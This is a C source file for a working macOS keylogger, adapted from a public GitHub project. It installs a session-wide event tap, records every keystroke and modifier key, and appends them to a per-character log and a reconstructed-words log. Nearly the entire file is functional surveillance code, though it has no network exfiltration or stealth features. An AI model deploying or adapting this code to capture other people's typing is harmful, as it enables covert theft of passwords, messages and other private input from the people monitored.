/*
 * Keylogger for MacOS.
 * Original source was from https://github.com/caseyscarborough/keylogger
 * I modifed it to suit my needs as far a printing one character
 * per line in the log and included caps and modifier keys.
 */
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
const char *convertKeyCode(int, bool);

FILE *outfile = NULL;
const char *keyfile = "keystroke.log";
FILE *outword = NULL;
const char *wordfile = "words.log";

// This struct keeps track of what modifier keys are currently active
struct modifier {
    bool lshift;
    bool rshift;
    bool lctrl;
    bool rctrl;
    bool lcmd;
    bool rcmd;
    bool lalt;
    bool ralt;
    bool func;
    bool caps;
} mdf;

// Toggle the value of a modifier key.  Note that we assume no modifiers are
// set when the program starts.  This will introduce accounting irregularities
// if a modifer is pressed during startup.
// This also assumes we get an event for key down and then a second event
// for key up.
void update_modifier(struct modifier *mod_list, CGKeyCode modifier)
{
    switch (modifier) {
        case 54:
            mod_list->lcmd = !mod_list->lcmd;
            break;
        case 55:
            mod_list->rcmd = !mod_list->rcmd;
            break;
        case 56:
            mod_list->lshift = !mod_list->lshift;
            break;
        case 57:
            mod_list->caps = !mod_list->caps;
            break;
        case 58:
            mod_list->lalt = !mod_list->lalt;
            break;
        case 59:
            mod_list->lctrl = !mod_list->lctrl;
            break;
        case 60:
            mod_list->rshift = !mod_list->rshift;
            break;
        case 61:
            mod_list->rshift = !mod_list->rshift;
            break;
        case 62:
            mod_list->rctrl = !mod_list->rctrl;
            break;
        case 63:
            mod_list->func = !mod_list->func;
            break;
        default:
            fprintf(stderr, "Error, unknown modifier %d\n", modifier);
            break;
    }
}

void print_modifier(struct modifier *mod_list, FILE *fp)
{
    // Caps and shift(s) are handled during the character printing
    if ( mod_list->lcmd )
        fprintf(fp, "%s", convertKeyCode(55, false));
    if ( mod_list->rcmd )
        fprintf(fp, "%s", convertKeyCode(54, false));
    if ( mod_list->lalt )
        fprintf(fp, "%s", convertKeyCode(58, false));
    if ( mod_list->ralt )
        fprintf(fp, "%s", convertKeyCode(61, false));
    if ( mod_list->lctrl )
        fprintf(fp, "%s", convertKeyCode(59, false));
    if ( mod_list->rctrl )
        fprintf(fp, "%s", convertKeyCode(62, false));
    if ( mod_list->func )
        fprintf(fp, "%s", convertKeyCode(63, false));
}

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type,
                           CGEventRef event, void *refcon)
{
    int keyCode;

    // Ignore events we don't care about
    if (type != kCGEventKeyDown &&
        type != kCGEventFlagsChanged &&
        type != kCGEventKeyUp)
        return event;

    // Retrieve the incoming keycode.
    keyCode = (int) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // If it's just a modifier key, update internal state and return
    if ( type == kCGEventFlagsChanged ) {
        update_modifier(&mdf, keyCode);
        return event;
    }
    if (type == kCGEventKeyUp) {
        return event;
    }

    // If any modifiers are set, print them first
    print_modifier(&mdf, outfile);
    print_modifier(&mdf, outword);

    // Print the human readable key to the logfile.
    bool shift = mdf.rshift || mdf.lshift || mdf.caps;
    fprintf(outfile, "%s\n", convertKeyCode(keyCode, shift));
    fflush(outfile);

    // Print the word line
    if ((int)keyCode == 36 || (int)keyCode == 49) {
        fprintf(outword, "\n");
        fflush(outword);
    } else {
        fprintf(outword, "%s", convertKeyCode(keyCode, shift));
    }

    return event;
}

// The following method converts the key code returned by each keypress as
// a human readable key code in const char format.
//
// This list is also customized to my keyboard specifically with regards to
// what the shift modifier does for specific keys, and that may not be the
// same for you.
const char *convertKeyCode(int keyCode, bool shift)
{
    switch ((int) keyCode) {
        case 0:   return(shift ? "A" : "a");
        case 1:   return(shift ? "S" : "s");
        case 2:   return(shift ? "D" : "d");
        case 3:   return(shift ? "F" : "f");
        case 4:   return(shift ? "H" : "h");
        case 5:   return(shift ? "G" : "g");
        case 6:   return(shift ? "Z" : "z");
        case 7:   return(shift ? "X" : "x");
        case 8:   return(shift ? "C" : "c");
        case 9:   return(shift ? "V" : "v");
        case 11:  return(shift ? "B" : "b");
        case 12:  return(shift ? "Q" : "q");
        case 13:  return(shift ? "W" : "w");
        case 14:  return(shift ? "E" : "e");
        case 15:  return(shift ? "R" : "r");
        case 16:  return(shift ? "Y" : "y");
        case 17:  return(shift ? "T" : "t");
        case 18:  return(shift ? "!" : "1");
        case 19:  return(shift ? "@" : "2");
        case 20:  return(shift ? "#" : "3");
        case 21:  return(shift ? "$" : "4");
        case 22:  return(shift ? "^" : "6");
        case 23:  return(shift ? "%" : "5");
        case 24:  return(shift ? "+" : "=");
        case 25:  return(shift ? "(" : "9");
        case 26:  return(shift ? "&" : "7");
        case 27:  return(shift ? "_" : "-");
        case 28:  return(shift ? "*" : "8");
        case 29:  return(shift ? ")" : "0");
        case 30:  return(shift ? "}" : "]");
        case 31:  return(shift ? "O" : "o");
        case 32:  return(shift ? "U" : "u");
        case 33:  return(shift ? "{" : "[");
        case 34:  return(shift ? "I" : "i");
        case 35:  return(shift ? "P" : "p");
        case 37:  return(shift ? "L" : "l");
        case 38:  return(shift ? "J" : "j");
        case 39:  return(shift ? "\"" : "'");
        case 40:  return(shift ? "K" : "k");
        case 41:  return(shift ? ":" : ";");
        case 42:  return(shift ? "|" : "\\");
        case 43:  return(shift ? "<" : ",");
        case 44:  return(shift ? "?" : "/");
        case 45:  return(shift ? "N" : "n");
        case 46:  return(shift ? "M" : "m");
        case 47:  return(shift ? ">" : ".");
        case 50:  return(shift ? "~" : "`");
        case 65:  return "[decimal]";
        case 67:  return "[asterisk]";
        case 69:  return "[plus]";
        case 71:  return "[clear]";
        case 75:  return "[divide]";
        case 76:  return "[enter]";
        case 78:  return "[hyphen]";
        case 81:  return "[equals]";
        case 82:  return "0";
        case 83:  return "1";
        case 84:  return "2";
        case 85:  return "3";
        case 86:  return "4";
        case 87:  return "5";
        case 88:  return "6";
        case 89:  return "7";
        case 91:  return "8";
        case 92:  return "9";
        case 36:  return "[return]";
        case 48:  return "[tab]";
        case 49:  return "[space]";
        case 51:  return "[del]";
        case 53:  return "[esc]";
        case 54:  return "[r-cmd]";
        case 55:  return "[l-cmd]";
        case 56:  return "[l-shift]";
        case 57:  return "[caps]";
        case 58:  return "[l-alt]";
        case 59:  return "[l-ctrl]";
        case 60:  return "[r-shift]";
        case 61:  return "[r-alt]";
        case 62:  return "[r-ctrl]";
        case 63:  return "[fn]";
        case 64:  return "[f17]";
        case 72:  return "[volup]";
        case 73:  return "[voldown]";
        case 74:  return "[mute]";
        case 79:  return "[f18]";
        case 80:  return "[f19]";
        case 90:  return "[f20]";
        case 96:  return "[f5]";
        case 97:  return "[f6]";
        case 98:  return "[f7]";
        case 99:  return "[f3]";
        case 100: return "[f8]";
        case 101: return "[f9]";
        case 103: return "[f11]";
        case 105: return "[f13]";
        case 106: return "[f16]";
        case 107: return "[f14]";
        case 109: return "[f10]";
        case 111: return "[f12]";
        case 113: return "[f15]";
        case 114: return "[help]";
        case 115: return "[home]";
        case 116: return "[pgup]";
        case 117: return "[fwddel]";
        case 118: return "[f4]";
        case 119: return "[end]";
        case 120: return "[f2]";
        case 121: return "[pgdown]";
        case 122: return "[f1]";
        case 123: return "[left]";
        case 124: return "[right]";
        case 125: return "[down]";
        case 126: return "[up]";
    }
    return "[unknown]";
}

int main(int argc, const char *argv[])
{

    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) |
                             CGEventMaskBit(kCGEventKeyUp) |
                             CGEventMaskBit(kCGEventFlagsChanged));
    CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap,
                                              kCGHeadInsertEventTap, 0,
                                              eventMask,
                                              CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if(!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(
                                           kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource,
                       kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);

    // Open the logfile.
    outfile = fopen(keyfile, "a");
    if (!outfile) {
        fprintf(stderr, "ERROR: Unable to open log file %s.\n", keyfile);
        exit(1);
    }
    outword = fopen(wordfile, "a");
    if (!outword) {
        fprintf(stderr, "ERROR: Unable to open word file %s.\n", wordfile);
        exit(1);
    }

    // Output to logfile.
    time_t t = time(NULL);
    fprintf(outfile, "Keylogging started at %s\n", asctime(localtime(&t)));
    fflush(outfile);
    fprintf(outword, "Wordlogging started at %s\n", asctime(localtime(&t)));
    fflush(outword);

    // Display the location of the logfile and start the loop.
    printf("Logging to: %s and %s\n", keyfile, wordfile);
    CFRunLoopRun();

    return 0;
}
